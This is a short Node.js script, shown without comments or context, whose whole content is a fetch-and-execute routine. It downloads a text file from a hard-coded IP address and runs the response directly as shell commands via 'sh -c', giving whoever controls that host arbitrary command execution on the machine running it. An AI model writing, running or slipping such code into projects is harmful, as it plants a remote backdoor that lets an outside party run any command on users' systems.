import { execFileSync } from "node:child_process";

const run = (cmd) => execFileSync("sh", ["-c", cmd]);
const res = await fetch("http://203.0.113.5/steps.txt");
run(await res.text());
